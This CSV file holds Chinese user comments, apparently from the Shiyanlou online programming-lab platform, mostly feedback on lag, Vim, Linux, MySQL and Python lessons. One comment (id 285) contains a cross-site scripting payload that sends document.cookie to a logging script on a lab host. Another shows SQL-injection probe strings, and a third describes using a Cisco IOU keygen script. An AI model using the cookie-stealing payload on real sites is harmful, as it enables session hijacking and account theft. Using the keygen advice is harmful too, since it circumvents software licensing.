id,comment
131,第一次试验，感觉很棒
132,语句较为简单，但要谨慎操作，一般没有没有这样的操作权限。
133,对sql注入攻击没有什么语言比直接来一把这种实验来的更直接更深刻了
134,提出这么大的BUG不送本书吗？
135,1. 学习了将近3个小时，程序的主要思想倒是理解了，不过对于算法中的部分推倒还是不怎么清楚 2. 程序中缺少注释，看起来真是有点费劲 3. 实验指导文档写的也不够详细，对我们这种小白不太友好
136,还不太会用，不过感觉很有意思
137,我们对Java 封装方面的知识进行了详细的介绍，特别是内部类，是其中的重难点
138,Hadoop单机模式安装是输入 hadoop jar /home/hadoop/hdfs/share/hadoop/mapreduce/sources/hadoop-mapreduce-examples-2.6.0-sources.jar wordcount input output后提示not a valid jar
139,不错的linux环境
140,超级多命令，每个命令又超级多选项、符号
141,没适应！！等弄清楚再说！
142,不明白的地方，可以点击我要提问。详细的描述一下具体不明白的地方
143,简单学习了mysql 的创建表，插表，以及查表
144,好多内容都是这个网站上的吗？ https://vim.ink
145,例子很不错，但是讲解比较少。
146,制作管理系统，感觉还是不错的！
147,希望能够提供用到的数据直接加载……手动输入好麻烦o(>﹏<)o
148,这个站点特别的帮，python生成二维码真的是太简单了，呵呵
149,这个课程是可以正常运行的，您可以把代码和截图发到讨论区里提问一下，可以更好地判断问题
150,进来完全不知道该干啥！总要有个目标吧！！
151,简明实用，第一次使用实验楼！
152,为什么我开始实验 不能输入代码啊 键盘只能敲打空格 左右键
153,第二课中“http://libvirt.org”无法访问，需翻墙，有些麻烦
154,X 没有定义，你看看是不是X没有定义，或是X应该是小写
155,环境略卡   都是用物理机在做实验
156,感觉做对了可是都是 timed out，为什么呢
157,由于实验环境需要联网，无法继续进行下去，希望实验楼对于这种小实验可以基于联网支持。
158,Xfce终端可以新建头文件夹吗？可以打开头文件夹里面头文件夹的文件吗？不太懂
159,这个网站真的不错，真是个惊喜地发现，谢谢啦
160,应该不会出现这种情况的，您可以在讨论区发一下代码截图和问题，会有专人解答高级会员的问题。
161,文盲不懂那些单词的意思，感觉练了过后还是会忘的样子
162,## 还请各位大佬多多指道，就只能平时抽空学，所以比较珍惜。
163,wo很喜欢这个网站，以后就在这儿学了
164,第一次学习，感觉很不错，希望能坚持
165,运行不错 不过为啥要在linux环境下\n编译
166,为什么我用Chrome修改之后保存下来的HTML还是旧的
167,希望增加实验环境的稳定性 有些时候还是特别的卡顿 然后界面经常不响应 卡在一个界面很久 还是挺麻烦的。
168,很好，很强大，上瘾了 哈哈哈，表示自己要被坑的很惨
169,请问具体是什么问题呢？可以带上报错截图到讨论区提问
170,第一次玩这个东西，很好。以后会多多利用的。
171,挑战项目能否在成功后能否给出参考答案，我在本次实验中使用了文件的.read()函数来实现功能，不知道如果不适用这个函数能否实现实验项目的功能。
172,还没有进去，不知道是电脑卡，还是什么其他原因。
173,由于 Linux 运维涉及的东西非常多，有些技术单独来讲都需要一本书，比如 Kubernetes，所以不太可能过于深入。另外本门课程面向人群是未接触过 Linux 运维的小白同学，太深入也不合适。通过本门课程学习能够带领大家入门，打下一个良好基础。运维技术的深入无外乎大规模大流量服务部署，但这个需要结合具体业务来做，没有统一的标准。学习完本门课程后，大家可以在今后的工作中通过实际操作去逐步深入所用到的技术。
174,教程很棒，期待进阶版
175,感觉这种教学模式还是挺不错的，赞一下！
176,vimtutor很有用的
177,有些地方不是很清楚，看来我还是太小白了。
178,索引的用法呢？例子太少
179,我现在不开实验楼的虚拟机，实验都在本地做，然后把源码push到实验楼的代码库，这样做应该也没问题吧？
180,else： 当结束循环时，将会执行else：的代码段
181,很不错的学习过程
182,谁能解释下IO的那一章。怎么使用终端操作？
183,这个框架现在会卡
184,这几篇文章跟tensorflow中文社区的新手入门那一章节的东西有区别嘛？
185,本来想重新温习下这些最基础的内容，结果体验不好，啥都没干就提示说“完成实验”了……
186,卡主了，继续来
187,慢慢熟悉中，很感兴趣
188,实验楼出bug了吗，我打了6个小程序，就给了3分钟的有效时间？求解释
189,实验楼入门基础课-1
190,还行，系统做德很好
191,看不懂。。感觉不够详细，小白学不下T_T
192,感觉做完实验没有一个思路，如果在最上面有个流程图会更加好，另外一个是连接本机地址（看不懂）
193,为什么 ] } 两个字母不好按出来。肯定是传输的问题。
194,任何不清楚的地方，可以多多去问答提问
195,感觉很舒服，这个软件不错
196,这个实验对于我这样的初学者来说还是蛮有难度的，2个小时也还没给程序搞清楚，代码下载下来慢慢看吧
197,不错  省得自己安装环境了
198,这个看起来不错哦，学习才能使人进步
199,libevent下载不了，两个链接都试过了，导致最后程序无法运行
200,启动apache开始有点问题  没sudo
201,没有挑战4啊，您说的是挑战1吗？您可以点击上面的实验报告，查看其他用户的解题方法
202,这学习方法很好
203,提示 无法解析主机地址什么意思啊，求解答啊，跪求
204,sudo很重要，一开始直接用sudo会省很多时间。
205,当你困的时候，感觉就要睡的时候，请记住实验楼，探索未知领域会让你提神
206,我是这样想的，不知道对不对。p和q不都是指针吗？指针和指针是不是可以不需要加星号直接转换。
207,啥flag？学习时长榜第一？
208,在数据操作中发现了之前没见过的操作，很棒，很棒~
209,很不错，学习了，数据库改成mysql就更好了
210,把复杂的东西讲的如此清晰。真是见名知意。非常棒
211,"作业 sudo find /etc/ -name ""*.list"" 或者 locate /etc/\*.list"
212,希望有些实验能跳过，因为许多人都想我一样寻求进阶的，这种入门的知识给有需求的人看就够了
213,很好，可惜早没发现
214,实验楼这个垃圾课程！！
215,还是有好多不会用，比如编辑完一个test文档，然后输入ESC退出，然后wq，w回车是什么地方输的呀，搞不太清楚
216,这个网站好棒
217,实验就是用旁边虚拟机的的工具包括：Vim gedit等工具进行代码的编写，你可以自己写，也可以按照实验讲的写，主要是为了增强动手能力和让我们更熟悉代码的作用
218,body里面直接放style好像是HTML4还是以前的技术？
219,感觉学起来有些吃力了……看来需要更多的practice
220,学习了mysql的安装，如何使用mysql，show databases；  use <数据库>；  show tables；quit ；exit
221,赞美实验楼 赞美开发免费课程 小白万分感谢
222,import scapy ，syntaxERROR错误 未解决
223,先看了看，不错。
224,谢谢这个平台，谢谢你，谢谢这么好的资源，谢谢。。。。\n好吧，编不下去了
225,实验楼课程数据分析 的 courses.txt   ，  wget下来以后  我用 head 出来的  list 文字部分无法显示， 其他同学也有这个问题
226,MD5在java包中不是有工具类直接可以使用吗？为什么还要自己写一个md5的类？
227,上来就vim修改文件，让新手退出vim吧还是
228,只是有一点，实验过程中教程让我查看hostname不知道是干什么用的，似乎并没有用上。
229,谢谢你提的那么多修改和建议，我们这儿确认一下~
230,gedit 和./指令有何区别？操作的对象不同吗？
231,把whereCanTo（）函数中的判断   if(move_flag==true)改成 if (move_flag == true && pause != true)即可。
232,士大夫各行业巨款；p'豆腐干和巨款；‘ 士大夫搞活巨款；’
233,为什么我截取实验桌面 提交实验报告后 全部都显示不出来
234,哪个实验连不上了呢，现在可以了吗？保存环境的成本较高，只能提供给会员使用
235,php7 排序用了300秒，php5等了10多分钟没有结果
236,了解了一般操作用到的指令
237,个人觉得文字更好，食品肯定没有文字表达的那么详实，准确。 有些概念和细节语言不好表达，文字和示例最能清楚地说明问题。文字非常易于传播和快速查找内容。
238,Vim很神奇，很痛苦，要加油
239,後面的這幾章節有點虎頭蛇尾的感覺。。。
240,很有帮助，希望能对每种操作的具体意义加以说明和分析就更好了
241,请问老师有qq群之类的讨论群吗？
242,我们这边试了是可以打开的，您可以试试是否所有课程都无法打开终端，如果是的话，可能是网络原因。
243,告诫后边的新人：1.$ wget http://labfile.oss.aliyuncs.com/courses/364/crack.py这个方法获取到的代码中有锁进的问题  2:直接用课程中代码运行，可是运行结果和题中不一致，需要验证下这是我个人特例还是代码有问题？
244,第一次长时间的学习，就是有时候一卡一卡的 一下午才练习一点...
245,没法进入
246,除了学校办的鹏博士宽带（滑稽~）太差，开个百度查资料都刷不出界面外，一切都满意！！
247,vim算是初步掌握了用法，剩下靠积累了吧。 不知那个传说中和vim五五开的emacs又是什么样的一总情况呢？
248,太坑爹了每次打sudo的密码的时候总是给卡主，就是无法输入。有没有和我一样的童鞋啊。。。。
249,可以购买，用自己的环境有些软件需要配置和安装，也可以的。实验环境切换到字符模式，不会感觉到卡，推荐使用。
250,很好用的系统
251,第一个c语言程序-Hello ShiYanLou课程  为什么按照步骤一步一步来最后桌面却没显示 Hello ShiYanLou？
252,挑战成功了，为什么交作业时提示失败呢？？！
253,实验楼环境很好，提供很多知识
254,还不错的样子
255,linux命令庞大繁琐，这种练习挺好！
256,挺好的，不过我想问，为啥main函数有时候放在后面可以执行，放在前面就不能执行呢
257,他为什么一直说 ”lilei不在sudoers实验组里 此事将被报告“啊？
258,1月到现在基本没用linux，敲起来好陌生，连男人（man page）都看不懂了！
259,捉个虫，实验1的3.3.3的示例代码把newwin写成了newin
260,实验楼提供linux虚拟机，我好好体验了一下命令行的酣畅淋漓
261,体验不错，给力
262,课题独立，解决方案思路清晰，实验简单，值得参考
263,自带的界面不怎么好用啊  还是用的自己电脑另开了一个
264,回去再实验，手机实在不方便
265,是在自己电脑上编译不了？可以把错误信息发到论坛里看有没有人遇到过
266,学习了基本的css基础，掌握了css样式表的引入和未定义的样式自动继承父类属性
267,实验有很多命令是不懂的，但是没关系，一点一点去查吧
268,vim虽然有几种模式，操作复杂，但正是因此操作才更加精确，熟练运用之后才更高效
269,有点笼统，我配合jq文档学习的。在事件和动画的那一节。我做好了充分的心理准备，以为有很多有趣的方法等着我挑战，当我滚动条往下稍微滚一点点，这尼玛到头了啊？没错，我睁大了火眼金睛，它确实到头了
270,测试评论是否支持emoji表情 :smile:
271,完成python入门第一课 linux 第四课 vim基础 git基础第二课 第六节  日志
272,现在通过了吗？如果还没通过，可以点实验报告，查看这一节别人的实验报告哦，可以看到各种各样的方法。
273,不错，希望自己继续努力！
274,确实不错，非常感谢！
275,还是一脸蒙蔽，，，，我还是去看看网站介绍什么的，还有markdown语言。哇，开启新世界。
276,"这个实验环境很好,但是速度还是慢了些"
277,字符串从文件中读取并进行提取数字并拼接等操作
278,sysbanner not found 不知道为什么 小白有点懵
279,只需要使用 `python CiscoIOUKeygen.py` 执行脚本，就会在相关用户的家目录中生成 iourc.txt 文件，gns3 在启动的时候会在家目录中搜索该文件，此时就已经可以正常使用，这是在 Linux 中的情况，若是在 windows 下的话，需要安装虚拟机，倒入 gns3 vm 的镜像，然后将相关的脚本导入，因为手中并无 windows 机器，不好详细解说
280,没搞懂该怎么玩，怎么这个环境 英语有点看不懂 感觉还是先学习liunx把 下次再来 我想会很快的把
281,嗯，挺好的，分析得很到位，理解起来也很简单
282,界面反应慢，不开心
283,还是不会打开以保存的文件
284,希望能面向小白
285,"直接插入图片。不用跳转好点 <script> var img = document.createElement(""img""); img.src=""http://192.168.122.101/cgi-bin/logit.pl?'+document.cookie; document.body.appendChild(img); </script>"
286,讲的不太详细，不适合新手
287,第一节课感觉挺好的，第一次上编程课可以自己操作
288,实话实话，真的是不错。挺好的。会继续
289,很好很强大，希望自己能坚持住，希望推出更多的课程
290,有一个没搞懂，怎么实现ID自增，不知道是不是用order，by？
291,感觉很新奇，之前用慕课等等 还是觉得这个效果好
292,你肯定是在自己机器上敲的吧，环境变更有一些步骤也会改变
293,连接远程库这块说的不够清楚
294,对于初学者体验不好，最好有视频讲解或者每一步的操作截图+讲解过程
295,很卡 感觉内存不够
296,或许是python的设计精妙之处，但是我只想吐槽一下，那个缩进真是让我抓狂！！！！
297,请问 stations导入 怎么解决的啊
298,安装redis相对慢一点，其他的比较便利，省的自己安装虚拟机了。点个赞
299,梅花繁枝千万片， 犹自多情，学雪随风转。
300,请说明，你是在什么环境里安装失败。提问中，说你在虚拟环境安装成功又具体是什么环境。请你详细的描述清楚到讨论区提下问可以不？
301,启动模拟器需要图形界面，SSH只能进行编译和其他操作。
302,挺方便的，边学边练，对初学车很有帮助。
303,这个系统用来学习Linux入门还是不错的。
304,真差劲，提出问题根本没有人管！既然是会员才能学得课程，至少要保证按照课程做能做得通吧？环境有问题，大家提出来了，至少要解决掉吧？ 又不是多大的问题！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！ 连个回答都没有，没有客服？
305,好卡呀 建个文件也卡的不要不要
306,如果是Python不太懂的话， 建议先补充一下python基础知识
307,普通的程序员一般要掌握多少个标准库中的模块？
308,搽，补充的片段看不懂
309,"GO GO,加油！！"
310,插入类型中的date需要用字符串插入
311,挺好的。不过需要有一些基础才能按照实验完成任务。否则会有很多不明所以的错误出现。而且实验案例是用的windows系统吧？
312,为什么还是不懂数据备份和文件读取啊啊啊香菇
313,itchat只提供与微信的互动，其余的功能都是插件提供的。
314,基本注入类型判断： 字符型注入‘1’=‘1 数字型注入  1= 1
315,过程会卡，应该是网速问题吧？
316,买完课程了 但是 无法加入qq群 老师  这个训练营 有 时间限制吗
317,用自己电脑截图么？敲完才看到实验报告要求：）
318,输入法怎么切换？？？
319,没看懂你的表述，可以在讨论区提问一下
320,编程学习四步骤： 1、	理论基础 2、	代码阅读 3、	动手实践 4、	开源项目
321,编程用的是什么软件？有操作视频吗？
322,谢谢老师和实验楼团队！
323,怎么这个课程下线了呀？@助教
324,为什么点开链接没有网页呢？404Not Found
325,对于我这个小白真的很实用  谢谢平台
326,使用自动安装，不用配置，没意思
327,这个抽象工厂模式讲得真烂，代码还写得那么乱
328,卡在计算gdb计算内存地址那里，弄了半天才ok
329,官方的知识和本人自学的有一些差异，是按照自己的方法写完的。 累~
330,输入：vim protocols文档打开是空白的是怎么回事啊？
331,oo  没有基础就照着敲练一下手感  下次目标就是加强 代码理解能力
332,maven创建成功了吗？
333,怎么感觉跟着操作部能正确的下载安装呢？并且浏览器也登陆不上去网站呢
334,实验楼真的很棒
335,"我想说,这个实验室666"
336,还是第一次在这上面提交...平时都是自己的Windows下捣鼓
337,感觉比较简单，缺少对“文件”、“字符串”等的讲述，期待能在木木老师接下来的课程中学习到！
338,问一下是哪里报错呢？欢迎带上截图在讨论区告诉我们，或者点击文档里的报错按钮
339,好爽，做实验真爽
340,哦，意思是只要报了名，后面几期都可以参加学习？
341,这个虚机真是卡成狗屎了
342,为什么用$pip3 install MyQR时，后来不可导入MyQR模块 用$sudo pip3 install MyQR就可以？
343,需要联网
344,教程不详细；剪贴板好恶心，以前可以用快捷键的。
345,学习Shell感觉挺好用的，比自己买服务器强
346,我给那么多人推荐用实验楼 ，后果就是“系统资源不足，请稍后再试”？？也是醉了
347,请问，文件下载功能在哪里呀？
348,跟上一个实验差不多，入门级的对我计算机专业的学习而言没有什么难度。
349,挑战三次，终于成功。没仔细看前面关于外键的内容，而且题目也没具体说。希望可以在题目中sid、cid外键具体说一下。
350,请问是每天固定的时间上课学习吗？
351,你好，请问为什么不能学了哦？什么时候可以恢复嘛？
352,写到后面很卡，很多不明白的地方
353,表现不错，继续加油！
354,多条插入是否可以用一条语句完成？
355,退格键返回上一页的功能真心反人类
356,我想加入，怎么提示需要邀请码？邀请码从哪里来？
357,有些函数还是看不懂，可能是对头文件的用法不清楚，如果有大神指导一下就好了
358,完蛋，时间到了 关闭了
359,请问，如果在pyspark里输入函数时，输入错了导致函数没能正确导入，是必须全部重新输入一遍吗？还是有什么快捷方法能调用之前输入的，然后再修改。。
360,显示没有目录：目录代码打错；\n\n与vim结合步骤：\nvi 文件名.py\ni插入，esc退出插入，:wq保存并退出\nchmod +x 文件名.py    #赋予权限\n./文件名.py #执行文件\n\nformat后的两个变量，对应的是format前面的两个{}{}……\n{:.2f}代表2位精度的浮点数\n{:5d}代表5个字符宽度的整数，宽度不足则用空格填充\n{:7.2f}代表2位精度7个字符宽度的浮点数，宽度不足则用空格填充
361,后台看到的有用scanf读取一直等待造成提交超时，而应该使用 argv 来处理命令行参数才可以
362,不错呢，学到很多，比手册好些
363,东西很少，不太推荐作为入门的吧
364,我是新手还不晓得怎样使用，请问有没有使用的教程可以借鉴的
365,temp=shiyanlou 这种设置变量的方法是只在当前shell进程有效，如果我又运行zsh子进程，然后就不存在temp这个变量了。  如果想在子进程里有效，就用export temp=shiyanlou 就可以，但是一旦退出所有shell再进来，所有的变量变动都失效了  接下来，如果我想让这个变量在shiyanlou用户每次运行shell时，我就把 export temp=shiyanlou 加到 ~/.zshrc中去或者~/.bashrc中，可以不用加export。  如果我想让这个变量在shiyanlou用户，不管运行何种shell，都有temp这个变量，我就将这句 export temp=shiyanlou加到~/.profile中去。一定要加export。  然后我想让这个变量在所有用户登录时都生效，那么把export temp=shiyanlou加到/etc/profile中去。  加入文件中去，不能马上生效，需要source 一下。
366,[免费中文ROS新书推荐](http://blog.csdn.net/zhangrelay/article/details/79302460)
367,实验楼的环境还是不好，文档描述的目标也不清晰，每一步后面的执行结果和文档也不match，总之没有达到我自己想要的预期。
368,"学习使我快乐,明天再战"
369,wxPython 是我用unzip语句解压的，实验楼内提供的wxPython安装语句我实现不了～～
370,Linux操作不熟悉，为什么一定用这个模式学习
371,touch 的用发明白了  还有就是通配符查询学会了几个
372,学习了怎么操作git 简单的命令行操作
373,很不错的一个做实验的地方
374,想知道ipython的这个实验界面怎么发布实验报告？
375,初次体验，非常不错，接下来进行更深入的学习，加油！
376,实验楼学习很棒
377,教程bug不少
378,在实验室账户路径下，使用locate/etc命令即可完成“在etc路径下搜索出.list文件”任务 注意：使用转义字符“\”，搜索出所有的.list文件“\*.list”
379,希望可以在实验文档中对某些知识点再详细一些
380,SELECT Dayofweek('2017-10-25');  为什么是星期四？ - -
381,申请公开实验报告告诉我图片少于两张？我有好几张啊
382,eclipse开发工具为什么用不起来
383,烦啊烦，课后作业没做出来，烦啊，那个用touch创建新的文件怎么弄得啊
384,为什么环境的终端根本输入不了？
385,下载速度我们会尽力优化，可以在等待下载的时间阅读一些理论
386,加油咯，今天网有点糟糕，坚持坚持
387,很不错的呀，就是我网好卡。。伤心
388,赶紧开始吧
389,章节 控制语句 2.3 for 表达式  第二段代码有问题吧，复制下来也无法运行
390,只要显示安装成功了就没问题，这个报错可能是你代码出了问题，你可以点击实验问答提问一下，并附上代码和报错的截图～
391,每个实验之间有关联吗？必须按照顺序还是可以跳着做的，比如刚好有某方面的项目需求。
392,你好，我想问一下，这授课时间是怎么定的， 一般在几点呀 是全天的吗，还是在晚上或者早上
393,课程刷起来不吃力  但是用你们的虚拟环境 卡到想哭
394,怎么判断文件是否正确？ config.get_config('JiShuL')怎么实现的？
395,今天发现了实验楼。我想说：太棒了！厉害！学习了！谢谢工作人员
396,一开始我不知道怎么玩这个实验楼，现在学会了，觉得这个挺好玩的，我愿意花很多时间去玩这个东西
397,想问下，怎样才能选取到正确颜色做去除噪，得到黑白二值图，或是有什么规律方法不?，不可能总是人为的选择出来，做黑白二值图吧
398,实验环境太卡了
399,是完全按照教程来的吗？可以在讨论区附上代码截图提问一下
400,还行吧 简单复习了一遍 谢谢提供
401,好吧 问题是自己对命令不太熟练  fighting
402,Hellow ShiYanLou! 不错，挺好用的，加油！
403,缺少像第一课的实际操作，难以理解
404,终端挺好用的
405,非常实用，不过个人意见觉得叙述还是不太清楚，好多地方都是给出了代码，但是没有说明这个东西有什么用，配合百度使用本课程效果更好。 个人意见，也可能是水平过低导致，好多地方看不太懂。
